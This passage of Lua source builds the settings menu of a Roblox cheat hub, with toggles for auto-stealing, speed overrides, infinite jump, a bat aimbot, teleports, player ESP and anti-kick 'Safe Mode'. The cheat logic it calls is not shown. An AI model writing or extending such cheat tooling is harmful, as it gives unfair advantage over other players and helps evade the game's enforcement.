                TS:Create(bs, TweenInfo.new(0.12), {Color = ROW_BORDER, Transparency = 0.25}):Play()
                if cb then
                    local n = tonumber(tb.Text)
                    if n then cb(n) else tb.Text = tostring(default) end
                    task.defer(function() saveAllSettings() end)
                end
            end)
            return tb
        end
    
        local function mkKeyButton(parent, kbEntry)
            local btn = Instance.new("TextButton", parent)
            btn.Size = UDim2.new(0, 80, 0, 24)
            btn.Position = UDim2.new(1, -88, 0.5, -12)
            btn.BackgroundColor3 = INP
            btn.BackgroundTransparency = 0.5
            btn.BorderSizePixel = 0
            local function getLabel() return (kbEntry.gp and kbEntry.gp.Name) or (kbEntry.kb and kbEntry.kb.Name) or "None" end
            btn.Text = getLabel()
            btn.TextColor3 = WHITE
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 9
            btn.ZIndex = 8
            btn.AutoButtonColor = false
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
            local bs = Instance.new("UIStroke", btn)
            bs.Color = ROW_BORDER
            bs.Thickness = 1
            local li = false; local lc; local pv = btn.Text; local listenStart = 0
            btn.Activated:Connect(function()
                if li then li = false; _anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; btn.TextColor3 = WHITE; return end
                pv = btn.Text; li = true; _anyKeyListening = true; listenStart = _tick(); btn.Text = "..."; btn.TextColor3 = WHITE
                lc = UIS.InputBegan:Connect(function(inp)
                    if not li then return end
                    if inp.KeyCode == Enum.KeyCode.Escape then li = false; _anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; btn.TextColor3 = WHITE; return end
                    local isGp = isGamepadInput(inp)
                    if isGp and _tick()-listenStart < 0.15 then return end
                    if not isBindableInput(inp) then return end
                    btn.Text = inp.KeyCode.Name; pv = inp.KeyCode.Name; btn.TextColor3 = WHITE
                    li = false; _anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end
                    if isGp then kbEntry.gp = inp.KeyCode; kbEntry.kb = nil else kbEntry.kb = inp.KeyCode; kbEntry.gp = nil end
                    task.defer(function() saveAllSettings() end)
                end)
            end)
            table.insert(keyButtonRefs, {btn = btn, entry = kbEntry})
            return btn
        end
    
        local function addKeybindRow(page, labelText, kbEntry)
            local row = mkRow(page, 40)
            mkLabel(row, labelText)
            mkKeyButton(row, kbEntry)
        end
    
        -- =========================================================
        -- SPEED TAB
        -- =========================================================
        mkSect(speedPage, "Movement Speeds")
        do local row = mkRow(speedPage, 42); mkLabel(row, "Normal Speed"); normalBox = mkBox(row, NS, 50, 56, function(v) if v > 0 and v <= 500 then NS = v; if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end end end) end
        do local row = mkRow(speedPage, 42); mkLabel(row, "Carry Speed"); carryBox = mkBox(row, CS, 50, 56, function(v) if v > 0 and v <= 500 then CS = v; if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end end end) end
        do local row = mkRow(speedPage, 42); mkLabel(row, "Lagger Normal Speed"); laggerBox = mkBox(row, LAGGER_SPEED, 50, 56, function(v) if v > 0 and v <= 500 then LAGGER_SPEED = v; if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end end end) end
        do local row = mkRow(speedPage, 42); mkLabel(row, "Lagger Carry Speed"); lagger2Box = mkBox(row, LAGGER_CARRY_SPEED, 50, 56, function(v) if v > 0 and v <= 500 then LAGGER_CARRY_SPEED = v; if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end end end) end
    
        mkSect(speedPage, "Active Mode")
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "Current Mode")
            modeValLbl = Instance.new("TextLabel", row)
            modeValLbl.Size = UDim2.new(0, 110, 1, 0)
            modeValLbl.Position = UDim2.new(1, -118, 0, 0)
            modeValLbl.BackgroundTransparency = 1
            modeValLbl.Text = "Normal"
            modeValLbl.TextColor3 = WHITE
            modeValLbl.Font = Enum.Font.GothamBold
            modeValLbl.TextSize = 12
            modeValLbl.TextXAlignment = Enum.TextXAlignment.Right
            modeValLbl.ZIndex = 8
            local clk = Instance.new("TextButton", row)
            clk.Size = UDim2.new(1,0,1,0)
            clk.BackgroundTransparency = 1
            clk.Text = ""
            clk.AutoButtonColor = false
            clk.ZIndex = 8
            clk.MouseButton1Click:Connect(function() toggleCarryMode() end)
        end
    
        mkSect(speedPage, "Auto Steal")
    
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "Auto Steal Mode")
    
            local holder = Instance.new("Frame", row)
            holder.Name = "StealModeSelector"
            holder.BackgroundColor3 = Color3.fromRGB(15,15,20)
            holder.BackgroundTransparency = 0.15
            holder.Size = UDim2.new(0, 120, 0, 30)
            holder.Position = UDim2.new(1, -130, 0.5, -15)
            holder.BorderSizePixel = 0
            holder.ClipsDescendants = true
            holder.ZIndex = 8
            Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 15)
    
            local holderStroke = Instance.new("UIStroke", holder)
            holderStroke.Color = Color3.fromRGB(60,60,70)
            holderStroke.Thickness = 1
            holderStroke.Transparency = 0.35
    
            local slide = Instance.new("Frame", holder)
            slide.Name = "SelectedSlide"
            slide.BackgroundColor3 = getThemeColor()
            slide.BackgroundTransparency = 0.15
            slide.Size = UDim2.new(0.5, -3, 1, -4)
            slide.Position = UDim2.new(0, 2, 0, 2)
            slide.BorderSizePixel = 0
            slide.ZIndex = 9
            Instance.new("UICorner", slide).CornerRadius = UDim.new(0, 13)
    
            local slideGrad = Instance.new("UIGradient", slide)
            slideGrad.Color = youtGradient(getThemeColor())
            slideGrad.Rotation = 0
    
            local slideStroke = Instance.new("UIStroke", slide)
            slideStroke.Color = getThemeColor()
            slideStroke.Thickness = 1.2
            slideStroke.Transparency = 0.1
    
            local v1Text = Instance.new("TextLabel", holder)
            v1Text.BackgroundTransparency = 1
            v1Text.Text = "V1"
            v1Text.TextColor3 = Color3.fromRGB(255,255,255)
            v1Text.Font = Enum.Font.GothamBlack
            v1Text.TextSize = 12
            v1Text.Size = UDim2.new(0.5, 0, 1, 0)
            v1Text.Position = UDim2.new(0, 0, 0, 0)
            v1Text.ZIndex = 10
    
            local v2Text = Instance.new("TextLabel", holder)
            v2Text.BackgroundTransparency = 1
            v2Text.Text = "V2"
            v2Text.TextColor3 = Color3.fromRGB(150,150,165)
            v2Text.Font = Enum.Font.GothamBlack
            v2Text.TextSize = 12
            v2Text.Size = UDim2.new(0.5, 0, 1, 0)
            v2Text.Position = UDim2.new(0.5, 0, 0, 0)
            v2Text.ZIndex = 10
    
            local v1Click = Instance.new("TextButton", holder)
            v1Click.BackgroundTransparency = 1
            v1Click.Text = ""
            v1Click.AutoButtonColor = false
            v1Click.Size = UDim2.new(0.5, 0, 1, 0)
            v1Click.Position = UDim2.new(0, 0, 0, 0)
            v1Click.ZIndex = 11
    
            local v2Click = Instance.new("TextButton", holder)
            v2Click.BackgroundTransparency = 1
            v2Click.Text = ""
            v2Click.AutoButtonColor = false
            v2Click.Size = UDim2.new(0.5, 0, 1, 0)
            v2Click.Position = UDim2.new(0.5, 0, 0, 0)
            v2Click.ZIndex = 11
    
            local function setStealModeVisual(mode)
                local onV2 = (mode == "V2")
                TS:Create(slide, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                    Position = onV2 and UDim2.new(0.5, 1, 0, 2) or UDim2.new(0, 2, 0, 2)
                }):Play()
                TS:Create(v1Text, TweenInfo.new(0.18), {
                    TextColor3 = onV2 and Color3.fromRGB(150,150,165) or Color3.fromRGB(255,255,255)
                }):Play()
                TS:Create(v2Text, TweenInfo.new(0.18), {
                    TextColor3 = onV2 and Color3.fromRGB(255,255,255) or Color3.fromRGB(150,150,165)
                }):Play()
            end
    
            local function changeMode(mode)
                local newMode = (mode == "V2") and "V2" or "V1"
                if newMode == selectedStealMode then return end
                selectedStealMode = newMode
                if selectedStealMode == "V2" then
                    CONFIG.STEAL_RANGE = 60
                    Steal.StealRadius = 60
                    if radInput then radInput.Text = "60" end
                end
                setStealModeVisual(selectedStealMode)
                if CONFIG.AUTO_STEAL_ENABLED then
                    pcall(startAutoSteal)
                end
                saveAllSettings()
            end
    
            v1Click.MouseButton1Click:Connect(function() changeMode("V1") end)
            v2Click.MouseButton1Click:Connect(function() changeMode("V2") end)
    
            _G._youtStealSlide = slide
            _G._youtStealModeSetter = setStealModeVisual
    
            setStealModeVisual(selectedStealMode)
        end
    
        setInstaGrab = mkFastToggle(speedPage, "Auto Steal", function(on)
            CONFIG.AUTO_STEAL_ENABLED = on
            if on then pcall(startAutoSteal) else stopAutoSteal() end
            updateProgressBarVisibility()
        end)
    
        do
            local row = mkRow(speedPage, 42)
            mkLabel(row, "Steal Radius")
            radInput = mkBox(row, CONFIG.STEAL_RANGE, 50, 56, function(v)
                if v and v >= 5 and v <= 300 then
                    CONFIG.STEAL_RANGE = _floor(v+0.5)
                    Steal.StealRadius = CONFIG.STEAL_RANGE
                    radInput.Text = tostring(CONFIG.STEAL_RANGE)
                    saveAllSettings()
                end
            end)
        end
    
        autoLeftSetVisual = mkFastToggle(speedPage, "Auto Left", function(on)
            autoLeftEnabled = on
            if on then startAutoLeft() else stopAutoLeft() end
            if mobSetAutoLeft then mobSetAutoLeft(on) end
        end)
        autoRightSetVisual = mkFastToggle(speedPage, "Auto Right", function(on)
            autoRightEnabled = on
            if on then startAutoRight() else stopAutoRight() end
            if mobSetAutoRight then mobSetAutoRight(on) end
        end)
    
        mkSect(speedPage, "Movement Extras")
        setUnwalkVisual = mkFastToggle(speedPage, "Unwalk", function(on)
            unwalkEnabled = on
            if on then startUnwalk() else stopUnwalk() end
        end)
    
        setInfiniteJumpVisual = mkFastToggle(speedPage, "Infinite Jump", function(on)
            infiniteJumpEnabled = on
            if on then InfiniteJump.start() else InfiniteJump.stop() end
            saveAllSettings()
        end)
        if setInfiniteJumpVisual then setInfiniteJumpVisual(infiniteJumpEnabled) end
    
        -- =========================================================
        -- COMBAT TAB
        -- =========================================================
        mkSect(combatPage, "Attack")
        autoBatSetVisual = mkFastToggle(combatPage, "Auto Bat", function(on)
            if on then enableAutoBat() else disableAutoBat() end
            if mobSetAutoBat then mobSetAutoBat(on) end
        end)
        do local row = mkRow(combatPage, 42); mkLabel(row, "Bat Aimbot Speed"); batSpeedBox = mkBox(row, BAT_AIMBOT_SPEED, 50, 56, function(v) if v > 0 and v <= 200 then BAT_AIMBOT_SPEED = v end end) end
        
        batDesyncTpSetVisual = mkFastToggle(combatPage, "TP BAT", function(on)
            if on then 
                if not batDesyncTpEnabled then toggleBatDesyncTp() end 
            else 
                if batDesyncTpEnabled then toggleBatDesyncTp() end 
            end
            if tpBatFloatingButton then
                local btnFrame = tpBatFloatingButton:FindFirstChild("Frame")
                if btnFrame then paintFloatingBtn(btnFrame, batDesyncTpEnabled) end
            end
            if _G.__YoutBatV2Frame then
                paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
            end
            if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
        end)
        if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
    
        -- Bat V2 toggle (renamed from "Bat Bypass")
        autoBatV2SetVisual = mkFastToggle(combatPage, "Bat V2", function(on)
            if on then
                if not autoBatV2Enabled then enableBatV2() end
            else
                if autoBatV2Enabled then disableBatV2() end
            end
            if _G.__YoutBatV2Frame then
                paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
            end
            if tpBatFloatingButton then
                local tpFrame = tpBatFloatingButton:FindFirstChild("Frame")
                if tpFrame then paintFloatingBtn(tpFrame, batDesyncTpEnabled) end
            end
            if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
        end)
        if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
    
            mkSect(combatPage, "Counters")
        
        setBatCounterVisual = mkFastToggle(combatPage, "Bat Counter", function(on)
            batCounterEnabled = on
            if on then startBatCounter() else stopBatCounter() end
        end)
        
        -- [ADDED] Ragdoll Timer Toggle
        setRagdollTimerVisual = mkFastToggle(combatPage, "Ragdoll Timer", function(on)
            ragdollTimerEnabled = on
            if not on then
                _ragdollTimerActive = false
                if _ragdollTimerBillboard then
                    pcall(function() _ragdollTimerBillboard:Destroy() end)
                    _ragdollTimerBillboard = nil
                end
            end
            saveAllSettings()
        end)
        if setRagdollTimerVisual then setRagdollTimerVisual(ragdollTimerEnabled) end
        
        setMedusaVisual = mkFastToggle(combatPage, "Medusa Counter", function(on)
            medusaCounterEnabled = on
            if on then
                if LP.Character then setupMedusaCounter(LP.Character) else stopMedusaCounter() end
            else
                stopMedusaCounter()
            end
            if setMedusaVisual then setMedusaVisual(on) end
        end)
    
        mkSect(combatPage, "Defense")
        bodyLockSetVisual = mkFastToggle(combatPage, "Lock Enemy", function(on)
            bodyLockEnabled = on
            if on then
                if _blSuppressCount == 0 then startBodyLock() end
            else
                stopBodyLock()
            end
        end)
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Lock Enemy Range")
            bodyLockRangeBox = mkBox(row, bodyLockRange, 50, 56, function(v)
                if v and v > 0 then
                    bodyLockRange = _clamp(_floor(v), 5, 200)
                    if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
                end
            end)
        end
    
        setAntiFlingVisual = mkFastToggle(combatPage, "Anti Fling", function(on)
            antiFlingEnabled = on
            if on then startAntiFling() else stopAntiFling() end
            saveAllSettings()
        end)
        if setAntiFlingVisual then setAntiFlingVisual(antiFlingEnabled) end
        setAntiRagVisual = mkFastToggle(combatPage, "Anti Ragdoll", function(on)
            if on then startAntiRagdollV2(); antiRagdollMode = "v2" else stopAntiRagdollV2(); antiRagdollMode = "off" end
            saveAllSettings()
        end)
        if setAntiRagVisual then setAntiRagVisual(antiRagdollMode == "v2") end
    
        setAntiDieVisual = mkFastToggle(combatPage, "Anti Die", function(on)
            antiDieEnabled = on
            if on then AntiDieModule.start() else AntiDieModule.stop() end
            saveAllSettings()
        end)
        if setAntiDieVisual then setAntiDieVisual(antiDieEnabled) end
    
        setSafeModeVisual = mkFastToggle(combatPage, "Safe Mode", function(on)
            antiKickEnabled = on
            if on and _G.AmbitiousSafeModeForceStop then
                _G.AmbitiousSafeModeForceStop("SAFE MODE")
            end
            saveAllSettings()
        end)
        if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
    
        CleanHubShowE01WarningSetVisual = mkFastToggle(combatPage, "Kick Warning", function(on)
            CleanHubShowE01Warning = on
            saveAllSettings()
        end)
        if CleanHubShowE01WarningSetVisual then CleanHubShowE01WarningSetVisual(CleanHubShowE01Warning) end
    
        mkSect(combatPage, "Auto TP Down")
        CleanHubAutoTPDownSetVisual = mkFastToggle(combatPage, "Auto TP Down", function(on)
            CleanHubAutoTPDown = on
            saveAllSettings()
        end)
        if CleanHubAutoTPDownSetVisual then CleanHubAutoTPDownSetVisual(CleanHubAutoTPDown) end
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "TP Down Height")
            CleanHubAutoTPDownHeightBox = mkBox(row, CleanHubAutoTPDownHeight, 50, 56, function(v)
                CleanHubAutoTPDownHeight = _clamp(v, 0, 500)
                saveAllSettings()
            end)
        end
        mirrorTPDownSetVisual = mkFastToggle(combatPage, "Mirror TP Down", function(on)
            _G.AmbitiousSetMirrorTPDown(on)
        end)
        if mirrorTPDownSetVisual then mirrorTPDownSetVisual(mirrorTPDownEnabled) end
    
        mkSect(combatPage, "Drop")
        dropBrainrotSetVisual = mkFastToggle(combatPage, "Drop Brainrot", function(on)
            if on then
                executeDropWithToggle(function(v)
                    dropBrainrotSetVisual(v)
                    if mobSetDropBR then mobSetDropBR(v) end
                end)
            end
        end)
        setDropVisual = dropBrainrotSetVisual
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Drop Mode")
            dropModeBtnRef = mkSelector(row, dropMode == 1 and "Fling" or "Jump Drop", {"Fling", "Jump Drop"}, function(dir, update)
                if dropActive then stopDropBrainrot() end
                dropMode = dropMode == 1 and 2 or 1
                update(dropMode == 1 and "Fling" or "Jump Drop")
            end)
        end
    
        mkSect(combatPage, "Skins")
        -- Bat Skin (Katana)
        local batSkinToggle = mkFastToggle(combatPage, "Bat Skin", function(on)
            katanaSkinEnabled = on
            if on then
                pcall(function() katanaSkinController.ApplySkin("KATANA") end)
            else
                pcall(function() katanaSkinController.ApplySkin("NONE") end)
            end
            saveAllSettings()
        end)
        if batSkinToggle then batSkinToggle(katanaSkinEnabled) end
    
        mkSect(combatPage, "Visual")
        setESPVIsual = mkFastToggle(combatPage, "Player ESP", function(on)
            toggleESP(on)
        end)
        if setESPVIsual then setESPVIsual(espEnabled) end
    
        setVividVisual = mkFastToggle(combatPage, "Vivid Graphics", function(on)
            toggleVividGraphics(on)
            if setVividVisual then setVividVisual(on) end
        end)
        if setVividVisual then setVividVisual(vividGraphicsEnabled) end
    
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Stretch Rez")
            local stretchBtn = Instance.new("TextButton", row)
            stretchBtn.Size = UDim2.new(0, 70, 0, 26)
            stretchBtn.Position = UDim2.new(1, -80, 0.5, -13)
            stretchBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            stretchBtn.BorderSizePixel = 0
            stretchBtn.Text = "OFF"
            stretchBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
            stretchBtn.Font = Enum.Font.GothamBold
            stretchBtn.TextSize = 12
            stretchBtn.AutoButtonColor = false
            stretchBtn.ZIndex = 9
            Instance.new("UICorner", stretchBtn).CornerRadius = UDim.new(0, 8)
            local stretchStroke = Instance.new("UIStroke", stretchBtn)
            stretchStroke.Color = Color3.fromRGB(80, 80, 90)
            stretchStroke.Thickness = 1
            local stretchOn = false
            local function setStretch(s)
                stretchOn = s
                if stretchOn then
                    stretchBtn.Text = "ON"
                    stretchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    stretchBtn.BackgroundColor3 = getThemeColor()
                    stretchStroke.Color = getThemeColor()
                    stretchStroke.Transparency = 0.3
                else
                    stretchBtn.Text = "OFF"
                    stretchBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
                    stretchBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
                    stretchStroke.Color = Color3.fromRGB(80, 80, 90)
                    stretchStroke.Transparency = 0
                end
                if stretchOn then enableStretch() else disableStretch() end
                stretchEnabled = stretchOn
            end
            stretchBtn.MouseButton1Click:Connect(function() setStretch(not stretchOn) end)
            _G.stretchToggleSetter = setStretch
        end
    
        setAntiLagVisual = mkFastToggle(combatPage, "Anti Lag", function(on)
            if on then enableAntiLag() else disableAntiLag() end
        end)
    
        -- FOV toggle + value
        setFovVisual = mkFastToggle(combatPage, "FOV", function(on)
            if on then enableCustomFov() else disableCustomFov() end
            saveAllSettings()
        end)
        if setFovVisual then setFovVisual(fovEnabled) end
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "FOV Value")
            local valLabel = Instance.new("TextLabel", row)
            valLabel.Size = UDim2.new(0, 40, 1, 0)
            valLabel.Position = UDim2.new(1, -48, 0, 0)
            valLabel.BackgroundTransparency = 1
            valLabel.Text = tostring(fovValue)
            valLabel.TextColor3 = WHITE
            valLabel.Font = Enum.Font.GothamBold
            valLabel.TextSize = 12
            valLabel.TextXAlignment = Enum.TextXAlignment.Right
            valLabel.ZIndex = 8
            local slider = mkBox(row, fovValue, 50, 96, function(v)
                if v and v >= 20 and v <= 120 then
                    fovValue = _floor(v + 0.5)
                    valLabel.Text = tostring(fovValue)
                    if fovEnabled then enableCustomFov() end
                    saveAllSettings()
                end
            end)
            fovSliderSet = function(nv)
                if slider then slider.Text = tostring(nv) end
                if valLabel then valLabel.Text = tostring(nv) end
            end
        end
    
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Sky Theme")
            local container = Instance.new("Frame", row)
            container.Size = UDim2.new(0, 160, 1, 0)
            container.Position = UDim2.new(1, -168, 0, 0)
            container.BackgroundTransparency = 1
            container.ZIndex = 8
            local leftBtn = Instance.new("TextButton", container)
            leftBtn.Size = UDim2.new(0, 28, 0, 26)
            leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
            leftBtn.BackgroundColor3 = INP
            leftBtn.BackgroundTransparency = 0.7
            leftBtn.BorderSizePixel = 0
            leftBtn.Text = "<"
            leftBtn.TextColor3 = WHITE
            leftBtn.Font = Enum.Font.GothamBold
            leftBtn.TextSize = 13
            leftBtn.AutoButtonColor = false
            leftBtn.ZIndex = 9
            Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
            skySelectorLabel = Instance.new("TextLabel", container)
            skySelectorLabel.Size = UDim2.new(0, 96, 0, 26)
            skySelectorLabel.Position = UDim2.new(0.5, -48, 0.5, -13)
            skySelectorLabel.BackgroundTransparency = 1
            skySelectorLabel.Text = skyTheme
            skySelectorLabel.TextColor3 = WHITE
            skySelectorLabel.Font = Enum.Font.GothamBold
            skySelectorLabel.TextSize = 11
            skySelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
            skySelectorLabel.ZIndex = 9
            local rightBtn = Instance.new("TextButton", container)
            rightBtn.Size = UDim2.new(0, 28, 0, 26)
            rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
            rightBtn.BackgroundColor3 = INP
            rightBtn.BackgroundTransparency = 0.7
            rightBtn.BorderSizePixel = 0
            rightBtn.Text = ">"
            rightBtn.TextColor3 = WHITE
            rightBtn.Font = Enum.Font.GothamBold
            rightBtn.TextSize = 13
            rightBtn.AutoButtonColor = false
            rightBtn.ZIndex = 9
            Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
            local function updateSkySelector(direction)
                local idx = 1
                for i, name in ipairs(SKY_PRESETS_LIST) do
                    if name == skyTheme then idx = i; break end
                end
                local newIdx = idx + direction
                if newIdx < 1 then newIdx = #SKY_PRESETS_LIST end
                if newIdx > #SKY_PRESETS_LIST then newIdx = 1 end
                local name = SKY_PRESETS_LIST[newIdx]
                skyTheme = name
                pcall(applyCustomSky, name)
                if skySelectorLabel then skySelectorLabel.Text = name end
                pcall(saveAllSettings)
            end
            leftBtn.MouseButton1Click:Connect(function() updateSkySelector(-1) end)
            rightBtn.MouseButton1Click:Connect(function() updateSkySelector(1) end)
        end
    
        -- Anim Pack + Outfit moved to COMBAT tab
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Anim Pack")
            local currentIndex = 1
            for i, entry in ipairs(ANIM_PACK_ORDER) do
                if entry[2] == currentAnimPack then currentIndex = i; break end
            end
            local container = Instance.new("Frame", row)
            container.Size = UDim2.new(0, 160, 1, 0)
            container.Position = UDim2.new(1, -168, 0, 0)
            container.BackgroundTransparency = 1
            container.ZIndex = 8
            local leftBtn = Instance.new("TextButton", container)
            leftBtn.Size = UDim2.new(0, 28, 0, 26)
            leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
            leftBtn.BackgroundColor3 = INP
            leftBtn.BackgroundTransparency = 0.7
            leftBtn.BorderSizePixel = 0
            leftBtn.Text = "<"
            leftBtn.TextColor3 = WHITE
            leftBtn.Font = Enum.Font.GothamBold
            leftBtn.TextSize = 13
            leftBtn.AutoButtonColor = false
            leftBtn.ZIndex = 9
            Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
            animSelectorLabel = Instance.new("TextLabel", container)
            animSelectorLabel.Size = UDim2.new(0, 80, 0, 26)
            animSelectorLabel.Position = UDim2.new(0.5, -40, 0.5, -13)
            animSelectorLabel.BackgroundTransparency = 1
            animSelectorLabel.Text = ANIM_PACK_ORDER[currentIndex][2]
            animSelectorLabel.TextColor3 = WHITE
            animSelectorLabel.Font = Enum.Font.GothamBold
            animSelectorLabel.TextSize = 12
            animSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
            animSelectorLabel.ZIndex = 9
            local rightBtn = Instance.new("TextButton", container)
            rightBtn.Size = UDim2.new(0, 28, 0, 26)
            rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
            rightBtn.BackgroundColor3 = INP
            rightBtn.BackgroundTransparency = 0.7
            rightBtn.BorderSizePixel = 0
            rightBtn.Text = ">"
            rightBtn.TextColor3 = WHITE
            rightBtn.Font = Enum.Font.GothamBold
            rightBtn.TextSize = 13
            rightBtn.AutoButtonColor = false
            rightBtn.ZIndex = 9
            Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
            local function updateAnimSelector(direction)
                local idx = 1
                for i, entry in ipairs(ANIM_PACK_ORDER) do
                    if entry[2] == currentAnimPack then idx = i; break end
                end
                local newIdx = idx + direction
                if newIdx < 1 then newIdx = #ANIM_PACK_ORDER end
                if newIdx > #ANIM_PACK_ORDER then newIdx = 1 end
                local packName = ANIM_PACK_ORDER[newIdx][2]
                if packName == "Off" then stopAnimPack() else startAnimPack(packName) end
            end
            leftBtn.MouseButton1Click:Connect(function() updateAnimSelector(-1) end)
            rightBtn.MouseButton1Click:Connect(function() updateAnimSelector(1) end)
        end
    
        do
            local row = mkRow(combatPage, 42)
            mkLabel(row, "Outfit")
            local container = Instance.new("Frame", row)
            container.Size = UDim2.new(0, 160, 1, 0)
            container.Position = UDim2.new(1, -168, 0, 0)
            container.BackgroundTransparency = 1
            container.ZIndex = 8
            local leftBtn = Instance.new("TextButton", container)
            leftBtn.Size = UDim2.new(0, 28, 0, 26)
            leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
            leftBtn.BackgroundColor3 = INP
            leftBtn.BackgroundTransparency = 0.7
            leftBtn.BorderSizePixel = 0
            leftBtn.Text = "<"
            leftBtn.TextColor3 = WHITE
            leftBtn.Font = Enum.Font.GothamBold
            leftBtn.TextSize = 13
            leftBtn.AutoButtonColor = false
            leftBtn.ZIndex = 9
            Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
            outfitSelectorLabel = Instance.new("TextLabel", container)
            outfitSelectorLabel.Size = UDim2.new(0, 80, 0, 26)
            outfitSelectorLabel.Position = UDim2.new(0.5, -40, 0.5, -13)
            outfitSelectorLabel.BackgroundTransparency = 1
            outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label
            outfitSelectorLabel.TextColor3 = WHITE
            outfitSelectorLabel.Font = Enum.Font.GothamBold
            outfitSelectorLabel.TextSize = 12
            outfitSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
            outfitSelectorLabel.ZIndex = 9
            local rightBtn = Instance.new("TextButton", container)
            rightBtn.Size = UDim2.new(0, 28, 0, 26)
            rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
            rightBtn.BackgroundColor3 = INP
            rightBtn.BackgroundTransparency = 0.7
            rightBtn.BorderSizePixel = 0
            rightBtn.Text = ">"
            rightBtn.TextColor3 = WHITE
            rightBtn.Font = Enum.Font.GothamBold
            rightBtn.TextSize = 13
            rightBtn.AutoButtonColor = false
            rightBtn.ZIndex = 9
            Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
            local function updateOutfit(direction)
                local newIdx = currentOutfitIndex + direction
                if newIdx < 1 then newIdx = #OUTFITS end
                if newIdx > #OUTFITS then newIdx = 1 end
                currentOutfitIndex = newIdx
                pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
                if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
                saveAllSettings()
            end
            leftBtn.MouseButton1Click:Connect(function() updateOutfit(-1) end)
            rightBtn.MouseButton1Click:Connect(function() updateOutfit(1) end)
        end
    
        -- =========================================================
        -- KEYBIND TAB
        -- =========================================================
        mkSect(keybindPage, "Keybinds")
        do
            local resetRow = mkRow(keybindPage, 40)
            mkLabel(resetRow, "Reset All Keybinds")
            local resetBtn = Instance.new("TextButton", resetRow)
            resetBtn.Size = UDim2.new(0, 92, 0, 24)
            resetBtn.Position = UDim2.new(1, -100, 0.5, -12)
            resetBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
            resetBtn.BorderSizePixel = 0
            resetBtn.Text = "RESET"
            resetBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
            resetBtn.Font = Enum.Font.GothamBold
            resetBtn.TextSize = 11
            resetBtn.ZIndex = 9
            Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 7)
            resetBtn.MouseButton1Click:Connect(function()
                for key, value in pairs(DEFAULT_KB) do
                    if KB[key] then KB[key].kb = value.kb; KB[key].gp = value.gp end
                end
                for _, ref in ipairs(keyButtonRefs) do
                    local entry = ref.entry
                    ref.btn.Text = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
                end
                resetBtn.Text = "RESET"
                task.defer(function() saveAllSettings(true) end)
                task.delay(1, function()
                    if resetBtn and resetBtn.Parent then resetBtn.Text = "RESET" end
                end)
            end)
        end
    
        mkSect(keybindPage, "Movement")
        addKeybindRow(keybindPage, "Carry Mode", KB.CarryToggle)
        addKeybindRow(keybindPage, "Lagger Mode", KB.LaggerMode)
        addKeybindRow(keybindPage, "Auto Left", KB.AutoLeft)
        addKeybindRow(keybindPage, "Auto Right", KB.AutoRight)
    
        mkSect(keybindPage, "Combat")
        addKeybindRow(keybindPage, "Auto Bat", KB.AutoBat)
        addKeybindRow(keybindPage, "TP BAT", KB.TPBat)
        addKeybindRow(keybindPage, "Bat V2", KB.BatV2)
    
        mkSect(keybindPage, "Utility")
        addKeybindRow(keybindPage, "Drop Brainrot", KB.DropBrainrot)
        addKeybindRow(keybindPage, "Hide GUI", KB.GuiHide)
        addKeybindRow(keybindPage, "TP Down", KB.TPFloor)
    
        -- =========================================================
        -- MANAGEMENT (bottom of SPEED tab, after all its content)
        -- =========================================================
        mkSect(speedPage, "Management")
    
